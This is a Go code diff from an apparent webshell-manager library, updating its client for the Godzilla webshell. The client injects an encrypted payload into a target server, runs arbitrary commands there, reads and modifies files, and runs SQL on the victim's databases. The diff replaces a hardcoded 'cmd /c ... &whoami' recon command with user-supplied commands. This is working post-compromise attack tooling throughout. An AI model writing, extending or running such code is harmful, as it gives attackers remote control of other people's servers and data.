@@ -11,6 +11,7 @@ import (
 	"github.com/Go0p/wsm/lib/shell"
 	"github.com/Go0p/wsm/lib/shell/godzilla"
 	"github.com/Go0p/wsm/lib/utils"
+	"log"
 	"strconv"
 	"strings"
 )
@@ -22,7 +23,8 @@ type GodzillaInfo struct {
 	// 哥斯拉的一些加密模式
 	Crypto godzilla.CrypticType
 	// 字符编码
-	Encode                  string
+	Encoding                string
+	encoding                godzilla.EncodingCharset
 	ReqLeft                 string
 	ReqRight                string
 	dynamicClassNameHashMap map[string]string
@@ -31,13 +33,19 @@ type GodzillaInfo struct {
 func NewGodzillaInfo(g *GodzillaInfo) (*GodzillaInfo, error) {
 	g.secretKey = utils.SecretKey(g.Key)
 	g.dynamicClassNameHashMap = make(map[string]string, 2)
-	if len(g.Encode) == 0 {
-		g.Encode = "utf-8"
+	if len(g.Encoding) == 0 {
+		g.Encoding = "utf-8"
 	}
 	if len(g.Crypto) == 0 {
 		return nil, errors.New("未指定加密类型")
 	}
+	g.encoding = godzilla.EncodingCharset{}
+	g.encoding.SetCharset(g.Encoding)
 	return g, nil
+}
+
+func (g *GodzillaInfo) Encodeing() {
+
 }
 
 func (g *GodzillaInfo) GetPayload() []byte {
@@ -137,8 +145,8 @@ func getParameter() *godzilla.Parameter {
 	}
 }
 
-// FirstBlood 第一次发送全部的 payload
-func (g *GodzillaInfo) FirstBlood() {
+// InjectPayload 第一次发送全部的 payload
+func (g *GodzillaInfo) InjectPayload() {
 	payload := g.GetPayload()
 	data := godzilla.Encrypto(payload, g.secretKey, g.Password, g.Crypto, g.Script)
 	_, ok := httpx.RequestAndParse(g.Url, g.Proxy, g.Headers, string(data), 0, 0)
@@ -171,21 +179,37 @@ func (g *GodzillaInfo) getBasicsInfo() string {
 	return string(basicsInfo)
 }
 
-// 命令执行
+// 命令执行，这个地方的传参处理好复杂啊，我真的不行了,栓Q =_=!
 func (g *GodzillaInfo) execCommand(commandStr string) string {
 	parameter := getParameter()
-	// 这个 cmdLine 多半是为了兼容 godzilla v3 ?
+	// 这个 cmdLine 参数多半是为了兼容 godzilla v3 ?
 	parameter.AddBytes("cmdLine", []byte(commandStr))
-	parameter.AddBytes("arg-0", []byte("cmd"))
-	parameter.AddBytes("arg-1", []byte("/c"))
-	parameter.AddBytes("arg-2", []byte(`cd /d "D:/Jdk/apache-tomcat-7.0.109/bin/"&whoami`))
-	//parameter.AddBytes("args-1", []byte("whoami"))
-	parameter.AddString("argsCount", "3")
-	parameter.AddString("executableFile", "cmd")
-	parameter.AddString("executableArgs", `/c "cd /d "D:/Jdk/apache-tomcat-7.0.109/bin/"&whoami"`)
+	commandArgs := godzilla.SplitArgs(commandStr, 10000, false)
+	for i := 0; i < len(commandArgs); i++ {
+		encode, err := g.encoding.CharsetEncode(commandArgs[i])
+		if err != nil {
+			log.Println(err)
+			parameter.AddBytes(fmt.Sprintf("arg-%d", i), []byte(commandArgs[i]))
+		}
+		parameter.AddBytes(fmt.Sprintf("arg-%d", i), encode)
+	}
 
+	parameter.AddString("argsCount", strconv.Itoa(len(commandArgs)))
+
+	executableArgs := godzilla.SplitArgs(commandStr, 1, false)
+	if len(executableArgs) > 0 {
+		parameter.AddString("executableFile", executableArgs[0])
+		if len(executableArgs) >= 2 {
+			parameter.AddString("executableArgs", executableArgs[1])
+		}
+	}
 	result := g.EvalFunc("", g.dynamicClassNameHashMap["execCommand"], parameter)
-	return string(result)
+	decode, err := g.encoding.CharsetDecode(result)
+	if err != nil {
+		return ""
+	}
+	return decode
+
 }
 
 func (g *GodzillaInfo) getFile(filePath string) string {
@@ -341,7 +365,7 @@ func (g *GodzillaInfo) setFileAttr(file, fileType, fileAttr string) bool {
 	}
 }
 
-func (g *GodzillaInfo) execSql(dbType, dbHost, dbUsername, dbPassword, execType, execSql string, dbPort int) string {
+func (g *GodzillaInfo) execSql(dbType, dbHost, dbUsername, dbPassword, execType, execSql string, dbPort int, options map[string]string) string {
 	parameter := getParameter()
 	parameter.AddString("dbType", dbType)
 	parameter.AddString("dbHost", dbHost)
@@ -350,6 +374,17 @@ func (g *GodzillaInfo) execSql(dbType, dbHost, dbUsername, dbPassword, execType,
 	parameter.AddString("dbPassword", dbPassword)
 	parameter.AddString("execType", execType)
 	parameter.AddBytes("execSql", []byte(execSql))
+	if len(options) != 0 {
+		dbCharset := options["dbCharset"]
+		currentDb := options["currentDb"]
+		if len(dbCharset) != 0 {
+			parameter.AddString("dbCharset", dbCharset)
+			parameter.AddBytes("execSql", []byte(execSql))
+		}
+		if len(currentDb) != 0 {
+			parameter.AddString("currentDb", currentDb)
+		}
+	}
 	result := g.EvalFunc("", "execSql", parameter)
 	return string(result)
 }
@@ -440,6 +475,6 @@ func (g *GodzillaInfo) BasicInfo() string {
 	return g.getBasicsInfo()
 }
 
-func (g *GodzillaInfo) CommandExec() string {
-	return g.execCommand(`cmd /c "cd /d "D:/Jdk/apache-tomcat-7.0.109/bin/"&whoami"`)
+func (g *GodzillaInfo) CommandExec(c string) string {
+	return g.execCommand(c)
 }
